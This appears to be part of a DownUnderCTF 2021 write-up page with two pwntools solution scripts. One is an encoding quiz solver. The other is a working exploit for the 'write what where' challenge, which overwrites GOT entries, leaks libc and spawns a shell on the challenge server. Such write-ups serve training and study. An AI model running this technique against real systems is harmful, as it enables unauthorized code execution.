<h4 id="general-skills-quiz-100-pts">General Skills Quiz [100 pts]<a href="#general-skills-quiz-100-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> codecs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64_decode</span>(data):
</span></span><span style="display:flex;"><span>    sitename_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sitename_bytes <span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">url_decode</span>(data):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parse<span style="color:#f92672">.</span>unquote(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rot13 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s : codecs<span style="color:#f92672">.</span>getencoder(<span style="color:#e6db74">&#34;rot-13&#34;</span>)(s)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn-2021.duc.tf&#34;</span>, <span style="color:#ae81ff">31905</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(str(int(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>), <span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(chr(int(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>), <span style="color:#ae81ff">16</span>)))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(url_decode(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(base64_decode(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(base64<span style="color:#f92672">.</span>b64encode(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>encode()))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rot13(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(codecs<span style="color:#f92672">.</span>encode(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>), <span style="color:#e6db74">&#39;rot_13&#39;</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(str(int(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>),<span style="color:#ae81ff">2</span>))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(str(bin(int(str(p<span style="color:#f92672">.</span>recv())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DUCTF&#39;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv())
</span></span></code></pre></div><pre tabindex="0"><code>DUCTF{you_aced_the_quiz!_have_a_gold_star_champion}
</code></pre><hr>
<h3 id="pwn-challenge">Pwn Challenge<a href="#pwn-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h1 id="write-what-where-310-pts">write what where [310 pts]<a href="#write-what-where-310-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;pwn-2021.duc.tf&#34;</span>, <span style="color:#ae81ff">31920</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r=process(&#34;./write-what-where&#34;)</span>
</span></span><span style="display:flex;"><span>b<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./write-what-where&#34;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>lib<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># lib=ELF(&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;)</span>
</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">=</span><span style="color:#ae81ff">0x404038</span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(b<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(exit)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(b<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(b<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;setvbuf&#39;</span>])<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(b<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;setvbuf&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(<span style="color:#ae81ff">0x404050</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(<span style="color:#ae81ff">0x404060</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(<span style="color:#ae81ff">0x404060</span><span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(b<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>]))  
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(exit)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base<span style="color:#f92672">=</span>u64(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">-</span>lib<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdout_&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(hex(base))
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>base<span style="color:#f92672">+</span>lib<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>binsh<span style="color:#f92672">=</span>base<span style="color:#f92672">+</span>list(lib<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(hex(system))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(b<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(exit)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(system<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(b<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;setvbuf&#39;</span>])<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32((system<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(b<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;setvbuf&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(binsh<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(<span style="color:#ae81ff">0x404060</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32((binsh<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(<span style="color:#ae81ff">0x404064</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r.send(b&#39;/sh\x00&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r.send(str(0x404054).rjust(9,&#39;0&#39;))</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r.send(b&#39;/sh\x00&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r.send(str(0x404054).rjust(9,&#39;0&#39;))</span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(p32(b<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>]))
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(str(exit)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">9</span>,<span style="color:#e6db74">&#39;0&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><pre tabindex="0"><code>DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
</code></pre>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
